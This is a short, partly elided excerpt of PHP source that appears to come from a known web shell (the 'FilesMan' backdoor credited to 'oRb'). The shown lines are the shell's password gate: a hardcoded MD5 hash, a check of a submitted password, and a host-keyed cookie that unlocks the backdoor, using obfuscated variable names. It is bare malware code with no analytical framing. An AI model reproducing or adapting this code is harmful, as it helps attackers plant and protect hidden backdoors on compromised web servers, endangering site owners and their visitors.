...
//-----------------Password---------------------
$psec = "fa769dac7a0a94ee47d8ebe021eaba9e";
$▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
...
/* (С) 11.2011 oRb */
if(!empty($psec)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $psec))
        prototype(md5($_SERVER['HTTP_HOST']), $psec);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $psec))
        hardLogin();
}
